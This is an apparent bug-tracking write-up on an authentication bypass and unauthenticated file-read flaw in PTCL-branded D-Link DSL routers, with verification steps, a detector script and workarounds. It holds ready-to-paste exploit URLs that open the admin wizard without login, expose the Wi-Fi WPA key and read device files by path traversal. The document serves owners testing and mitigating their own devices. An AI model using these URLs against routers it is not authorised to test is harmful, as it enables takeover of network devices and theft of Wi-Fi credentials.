# Bug to fix — PTCL D-Link router opens without login (and stays open)

**Status:** open, unfixed · **Device:** PTCL-shipped D-Link DSL-series (DSL-2750U / 2730U / 2750E)
**Component:** `/cgi-bin/webproc` (Conexant web UI) · **Owner:** nobody — see *Who fixes this* below
**Related:** [`ptcl-dlink/`](ptcl-dlink/) · [`ptcl-dlink/notes/auth-bypass.md`](ptcl-dlink/notes/auth-bypass.md)

---

## What the bug is

Two symptoms, one root cause:

1. **Opens without login** — the setup-wizard code path (`var:page=wizard`) is served to
   unauthenticated requests. It predates the admin account existing, so it never checks the session.
2. **Stays open** — that unauthenticated response hands out a real `:sessionid`. Nothing ever
   invalidates it and there is no timeout, so the UI keeps opening with no password afterwards.

Same parameter (`getpage`) also takes **filesystem paths**, which is the unauthenticated
file-read bug (CVE-2025-34048, CVSS 8.7).

---

## Router addresses to try

| address | notes |
|---|---|
| `http://192.168.10.1/` | PTCL builds — sticker and PTCL docs say this |
| `http://192.168.1.1/` | also reported; D-Link's generic manual says this |

Try both. If neither answers, check the sticker on the bottom of the unit.

> Replace `192.168.10.1` below with whichever one your unit actually answers on.
> All of these work on port 80. If your UI is on another port, append it (e.g. `:8080`).

---

## The URLs

### 1. BYPASS — wizard entrance ★ the main one

```
http://192.168.10.1/cgi-bin/webproc?getpage=html/index.html&errorpage=html/index.html&var:language=en_us&var:menu=setup&var:subpage=wizentrance&var:page=wizard
```

This is the published PoC. Expected on a vulnerable unit: the wizard UI, **no login prompt**.

### 2. BYPASS — shortest form

```
http://192.168.10.1/cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard
```

Same thing with the optional parameters dropped. Handy for a quick check.

### 3. BYPASS — wireless step ★ leaks SSID + WPA key

```
http://192.168.10.1/cgi-bin/webproc?getpage=html/index.html&errorpage=html/index.html&var:language=en_us&var:menu=setup&var:subpage=wizwl&var:page=wizard
```

On a vulnerable unit the Wi-Fi name and the actual WPA key appear in the **page source** as JS
variables (`var wireless_name`, `var randomWPAKEY`), hidden on screen only by
`<input type="password">`. View source / Ctrl-U to see them.

### 4. TRAVERSAL — unauthenticated file read

```
http://192.168.10.1/cgi-bin/webproc?getpage=/proc/version&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard
```

Same parameter, filesystem path instead of template name. `/proc/version` is shown as a safe
marker — if a Linux kernel string comes back, the read worked.

> **Change what follows `getpage=` and there are as many URLs as there are files on the device.**
> That is exactly why CVE-2025-34048 exists. The sensitive targets (credentials, config
> partition) are documented with their sources in
> [`notes/auth-bypass.md`](ptcl-dlink/notes/auth-bypass.md) §4 rather than duplicated as
> ready-to-paste links here.

### 5. Dashboard — proves the session persists

```
http://192.168.10.1/cgi-bin/webproc?getpage=html/index.html&errorpage=html/index.html&var:language=en_us&var:menu=status&var:page=deviceinfo
```

Normally this demands a login. If it renders **after** you visited URL 1, with no password ever
typed, that is the "keeps open" half of the bug confirmed.

### 6. Second navigation — proves it isn't a one-off

```
http://192.168.10.1/cgi-bin/webproc?getpage=html/index.html&errorpage=html/index.html&var:language=en_us&var:menu=advanced&var:page=accessctl
```

A different page in a different menu section. If this also loads, the session is being honoured
across the whole UI, not just once.

### 7. Baseline — should show the login form

```
http://192.168.10.1/
```

Control case. On an unfixed unit this is the *only* one that should ask for a password.

---

## Order to test

| step | URL # | URL | what a vulnerable unit does | what a fixed unit does |
|---|---|---|---|---|
| 1 | 7 | `/` (baseline) | shows login form | shows login form |
| 2 | 1 | wizard entrance | **wizard renders, no login** | redirects to login |
| 3 | 2 | shortest form | **wizard renders, no login** | redirects to login |
| 4 | 3 | wireless step | **SSID + WPA key in source** | redirects to login |
| 5 | 5 | dashboard | **loads** (session was minted in step 2) | redirects to login |
| 6 | 6 | second navigation | **loads** | redirects to login |
| 7 | 4 | traversal | **`/proc/version` returns** | refuses |

Steps 5 and 6 are the ones that answer *"why does it keep staying open?"* — they only work
because step 2 minted a real session without a password.

> The URL numbers above are their numbers in *The URLs* section, not the test order. Step 2
> there uses URL **1**; the dashboard is URL **5**.

---

## Automated check

Instead of clicking through the above, run the read-only detector:

```bash
cd ptcl-dlink
python3 tools/ptcl_check.py 192.168.10.1               # full check
python3 tools/ptcl_check.py 192.168.10.1 --urls        # just print these URLs, no probing
python3 tools/ptcl_check.py 192.168.10.1 --json out.json
```

It issues **GET only**, submits no credentials, never prints a recovered key, probes traversal
with `/proc/version` only, and refuses any target outside your LAN. Exit codes:
`0` not vulnerable · `1` **vulnerable** · `2` refused.

---

## How to verify it is actually fixed

A unit is **not** fixed if the URL merely *looks* different. Confirm all six:

- [ ] URL 1 **and** URL 2 redirect to the login form instead of rendering the wizard
- [ ] URL 3 contains no `var wireless_name` and no `var randomWPAKEY` anywhere in the source
- [ ] URL 5 (dashboard) does **not** load after visiting URL 1 — proof no session was minted
- [ ] URL 6 (second navigation) returns the login form, not the page
- [ ] URL 4 (traversal) does not return a Linux version string
- [ ] `python3 tools/ptcl_check.py <ip>` exits `0`

Then repeat the check **after a reboot** — if it fails again on a fresh boot, nothing was fixed;
the session had simply been cleared from RAM.

> A note on what "fixed" can realistically mean here: D-Link will not patch a PTCL unit and PTCL
> publishes no security advisories for it, so for most people the practical fix is the
> *workaround* section below — take the unit out of the gateway role. Treat the checkbox list
> above as a way to *measure* the problem, not as a patch you are waiting on.

---

## Workaround until this is fixed

The device cannot be patched by you, so reduce what the bug can reach:

| # | action | why |
|---|---|---|
| 1 | **Rotate the Wi-Fi PSK, then the admin password** | both may already be disclosed — assume compromise, don't audit it |
| 2 | **Disable remote / WAN management** | stops it being reachable from the internet, not just your LAN |
| 3 | **Reboot the router** | the only reliable way to drop a bypass-minted `:sessionid` (kept in RAM) |
| 4 | **Ask PTCL for a current build** for your H/W revision | `D1` / `J1` / `T3` are **not** cross-flashable; a wrong image returns `illegal image` |
| 5 | **Bridge the unit, route behind hardware you control** | the only durable fix — this is where the `wr720n/` work becomes relevant |

---

## Who fixes this

Neither party currently owns it:

* **D-Link** — their forum position is that ISP-branded firmware is out of scope: *"D-Link does
  not support or develop for this particular modem in these cases."* They also **disputed**
  CVE-2019-1010155/1010156, arguing the wizard "can't actually configure anything" — a claim that
  does not touch CVE-2025-34048.
* **PTCL** — ships the build, publishes no CVE-tracked advisories and no security feed for it.
* **The affected-version lists** name retail builds only (`IN_*`, `SEA_*`, `ME_*`). PTCL's ISP
  builds (`PT_*`, `K92_PTCL_*`, `GAN5.PT113A-*`) appear in **none** of them — untested, not clean.

**Planning assumption: never fixed.** Work around it, don't wait for it.

---

## Evidence log

Fill this in as you test. Keep the model, firmware string and result together — that is what
makes the finding worth reporting.

| date | model | H/W rev | firmware | address | URLs that worked | result |
|---|---|---|---|---|---|---|
| | | | | | | |
| | | | | | | |

`python3 tools/ptcl_check.py <ip> --json report.json` writes the same details machine-readably.

---

## Safety

Every URL above is a **GET request**, and none of them changes a setting. Two cautions anyway:

* The wizard's **step 2 writes Internet-connection config**. If you click through the wizard and
  submit bad values there, you can take the WAN link down — that is the documented DoS. Don't
  click *Next* on step 2 just to see what happens.
* If your admin UI is reachable from the internet, this is no longer a LAN problem. Check that
  first, before anything else on this page.
